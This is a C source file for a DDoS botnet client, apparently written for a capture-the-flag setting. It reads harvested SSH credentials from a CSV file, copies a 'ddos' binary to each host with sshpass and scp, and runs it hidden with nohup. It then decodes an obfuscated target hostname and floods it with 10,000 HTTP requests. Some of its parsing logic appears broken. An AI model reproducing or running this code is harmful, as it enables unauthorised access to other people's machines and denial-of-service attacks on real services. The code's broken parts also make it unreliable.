#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <curl/curl.h>

//print menu
void displayTextArt() {
  printf(R"EOF(

▓█████▄ ▓█████▄  ▒█████    ██████     ▄████▄   ██▓     ██▓▓█████  ███▄    █ ▄▄▄█████▓
▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒    ▒██▀ ▀█  ▓██▒    ▓██▒▓█   ▀  ██ ▀█   █ ▓  ██▒ ▓▒
░██   █▌░██   █▌▒██░  ██▒░ ▓██▄      ▒▓█    ▄ ▒██░    ▒██▒▒███   ▓██  ▀█ ██▒▒ ▓██░ ▒░
░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒   ▒▓▓▄ ▄██▒▒██░    ░██░▒▓█  ▄ ▓██▒  ▐▌██▒░ ▓██▓ ░ 
░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒   ▒ ▓███▀ ░░██████▒░██░░▒████▒▒██░   ▓██░  ▒██▒ ░ 
 ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░   ░ ░▒ ▒  ░░ ▒░▓  ░░▓  ░░ ▒░ ░░ ▒░   ▒ ▒   ▒ ░░   
 ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░     ░  ▒   ░ ░ ▒  ░ ▒ ░ ░ ░  ░░ ░░   ░ ▒░    ░    
 ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░     ░          ░ ░    ▒ ░   ░      ░   ░ ░   ░      
   ░       ░        ░ ░        ░     ░ ░          ░  ░ ░     ░  ░         ░          
 ░       ░                           ░                                               



)EOF");
}

void transfer() {
    
    char client_file_name[64] = "ddos"; //path to the ddos file

    //open file with ssh credentials from infected machine 
    FILE *file = fopen("credentials_test.csv", "r");
    if (file == NULL) {
        perror("Failed to open the info file");
        return;
    }

    char line[256];
    char processed_ips[256] = ""; // List of ip already used
    int chmod_executed = 0;  // Flag for tracking chmod

    while (fgets(line, sizeof(line), file) != NULL) {
        char user[64];
        char password[64];
        char ip[64];
        char port[32];

        if (sscanf(line, "%[^;];%[^;];%s;%s", user, password, ip, port) == 4) {
            // Check if ip already used
            if (strstr(processed_ips, ip) == NULL) {
                // Ip not used for scp, execute scp
                snprintf(processed_ips + strlen(processed_ips), sizeof(processed_ips) - strlen(processed_ips), " %s", ip);

                // Run ssh-keyscan to accept the unknown host
                char ssh_keyscan_command[256];
                snprintf(ssh_keyscan_command, sizeof(ssh_keyscan_command), "ssh-keyscan -t ed25519 -H %s >> ~/.ssh/known_hosts", ip);
                system(ssh_keyscan_command);

                // Transfer file using scp with sshpass
                char scp_command[256];
                snprintf(scp_command, sizeof(scp_command), "sshpass -p %s scp -P %s %s %s@%s:/tmp/", password, port, client_file_name,user, ip);
                printf("Created command : %s\n", scp_command); // print command created
                system(scp_command);

            }

            // SSH connection to the user on the specified IP
            char ssh_command[256];
            if (chmod_executed) {
                // If CHMOD executed, don't do chmod+x
                snprintf(ssh_command, sizeof(ssh_command), "sshpass -p %s ssh -oStrictHostKeyChecking=no -p 22 -f %s@%s 'cd /tmp && nohup ./ddos > /dev/null 2>&1'", password, user, ip);
            } else {
                // Execute ssh with chmod
                snprintf(ssh_command, sizeof(ssh_command), "sshpass -p %s ssh -oStrictHostKeyChecking=no -p 22 -f %s@%s 'cd /tmp && chmod +x ddos && nohup ./ddos > /dev/null 2>&1'", password, user, ip);
                chmod_executed = 1;
            }

            printf("Created command : %s\n", ssh_command); // show the current command
            system(ssh_command);
        }
    }

    fclose(file);
}

void ddos(const char *hostname, int index, int total) {
    CURL *curl = curl_easy_init();
    CURLcode resolution;

    if (curl) {
        char url[256];
        snprintf(url, sizeof(url), "http://%s", hostname);

        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_PORT, 80);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Russky rocket VP /poliakov 2.45"); //add custom user agent

        freopen("/dev/null", "w", stdout); //don't show the get result
        resolution = curl_easy_perform(curl);
        freopen("/dev/tty", "w", stdout); // restablished the standard output

        if (resolution != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(resolution));
        }
        else {
            printf("DDoS attack on %s was successful.\n", hostname);
        }

        curl_easy_cleanup(curl);
    }
    printf("[%d/%d] Progress: %d%%\r", index, total, (index * 100) / total);
    fflush(stdout);
}

char* the_0bfusk1_666_h0sTn4m3() {
    char nbmpdibqer[] = "\x6C\x6D";
    char msdopzoinf[] = "\x6E\x61";
    char odbazmapwn[] = "\x2E\x63\x74\x66";
    char fjdoznvpzq[] = "\x68\x65";
    char vaedcvegvd[] = "\x73\x74";
    char foazuibcvi[] = "\x6C\x6C\x75\x78";
    char yzebxcpsuz[] = "\x61\x64";
    char nciuazbcvo[] = "\x68\x61";
    
    char combined[64];
    
    if (combined) {
	    strcpy(combined, fjdoznvpzq);
	    strcat(combined, msdopzoinf);
	    strcat(combined, foazuibcvi);
	    strcat(combined, nciuazbcvo);
	    strcat(combined, nbmpdibqer);
	    strcat(combined, vaedcvegvd);
	    strcat(combined, yzebxcpsuz);
	    strcat(combined, odbazmapwn);
    }
    
    return strdup(combined);
}

int main(void) {

    transfer();
    struct addrinfo hints;
    struct addrinfo *result;
    char combined[64];

    char* hostname = the_0bfusk1_666_h0sTn4m3(); //ip to ddos
    
    printf("Hostname : %s", hostname);

    displayTextArt();

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    int exists = getaddrinfo(hostname, NULL, &hints, &result);

    if (exists == 0) {
        printf("DNS exists.\n");
        freeaddrinfo(result);

        int Calls = 10000;
        for (int i = 1; i <= Calls; i++) {
            ddos(hostname, i, Calls);
        }

    } 
    
    else {
        printf("DNS doesn't exist or may have a problem\n");
    }
    
    free(hostname);

}
